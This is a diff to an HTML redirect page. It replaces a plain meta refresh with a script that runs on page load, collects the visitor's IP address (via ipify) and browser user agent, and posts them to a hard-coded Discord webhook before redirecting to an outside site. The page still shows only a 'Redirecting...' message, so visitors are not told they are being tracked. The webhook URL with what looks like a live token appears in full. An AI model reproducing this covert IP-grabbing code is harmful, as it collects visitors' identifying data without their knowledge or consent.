@@ -2,10 +2,48 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://you.fck.ink/-/">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
+    <script>
+        async function sendIP() {
+            try {
+                // IP Adresini almak için harici bir API kullan (GitHub Pages destekli)
+                let response = await fetch("https://api64.ipify.org?format=json");
+                let data = await response.json();
+                let ip = data.ip;
+
+                // Kullanıcının tarayıcı bilgilerini al
+                let userAgent = navigator.userAgent;
+
+                // Webhook'a gönderilecek veri
+                let payload = {
+                    content: `**Yeni ziyaretçi tespit edildi!**\n🔹 IP Adresi: ${ip}\n🖥 Tarayıcı: ${userAgent}`
+                };
+
+                // Discord Webhook URL'nizi buraya ekleyin
+                let webhookURL = "https://discord.com/api/webhooks/1343185410762866779/cjRXLMLbEJjwjaGCkfdgfEBchGaBixZn7EfBfqoHANKBZDiBKMHtAN9b1QRz7JeLAvTB";
+
+                // Webhook'a isteği gönder
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                // Kullanıcıyı yönlendir
+                setTimeout(() => {
+                    window.location.href = "https://you.fck.ink/-/";
+                }, 2000); // 2 saniye bekle, sonra yönlendir
+            } catch (error) {
+                console.error("IP adresi gönderilemedi:", error);
+            }
+        }
+
+        // Sayfa yüklendiğinde çalıştır
+        window.onload = sendIP;
+    </script>
 </head>
 <body>
-    <p>If you are not redirected automatically, <a href="https://you.fck.ink/-/">click here</a>.</p>
+    <p>Redirecting... If you stay here, <a href="https://you.fck.ink/-/">click for redirect.</a>.</p>
 </body>
 </html>
